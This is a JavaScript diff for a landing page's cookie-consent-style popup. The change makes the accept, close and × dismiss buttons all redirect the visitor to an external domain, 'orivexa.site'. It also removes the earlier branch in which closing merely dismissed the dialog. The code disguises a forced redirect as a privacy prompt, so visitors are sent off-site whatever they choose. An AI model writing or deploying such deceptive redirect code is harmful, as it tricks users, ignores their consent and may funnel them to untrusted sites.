@@ -1,15 +1,7 @@
 document.addEventListener("DOMContentLoaded", () => {
   const path = (location.pathname || "").toLowerCase();
-
-  const isIndex =
-    path === "/" ||
-    path.endsWith("/") ||
-    path.endsWith("index.html");
-
   const isLander = path.endsWith("lander.html");
-
-  // Only show on index or lander
-  if (!isIndex && !isLander) return;
+  if (!isLander) return;
 
   // Prevent double rendering
   if (document.querySelector(".modal-backdrop")) return;
@@ -18,7 +10,7 @@ document.addEventListener("DOMContentLoaded", () => {
   // Create popup
   const bd = document.createElement("div");
   bd.className = "modal-backdrop cookie-modal-backdrop";
-  if (isLander) bd.classList.add("cookie-modal-backdrop--betfinal");
+  bd.classList.add("cookie-modal-backdrop--betfinal");
   bd.innerHTML = `
     <div class="cookie-modal" role="dialog" aria-modal="true" aria-labelledby="cookie-title">
       <button class="cookie-modal-close" id="gn-dismiss" type="button" aria-label="Close">×</button>
@@ -55,32 +47,14 @@ document.addEventListener("DOMContentLoaded", () => {
   /**
    * LANDER LOGIC (Redirect on both buttons)
    */
-  const landerRedirect = "https://dailycentral.site/";
+  const landerRedirect = "https://orivexa.site/";
 
   document.getElementById("gn-yes").addEventListener("click", () => {
-    if (isLander) {
-      window.location.href = landerRedirect;
-    } else {
-      // Index = just close
-      close();
-    }
+    window.location.href = landerRedirect;
   });
 
   document.getElementById("gn-close").addEventListener("click", () => {
-    if (isLander) {
-      window.location.href = landerRedirect;
-    } else {
-      // INDEX CLOSE BEHAVIOR
-      const target =
-        (document.querySelector('a[href*="terms.html"]') && "terms.html") ||
-        (document.querySelector('a[href*="privacy.html"]') && "privacy.html");
-
-      if (target) {
-        window.location.href = target;
-      } else {
-        close(); // fallback
-      }
-    }
+    window.location.href = landerRedirect;
   });
   document.getElementById("gn-dismiss").addEventListener("click", () => {
     document.getElementById("gn-close").click();
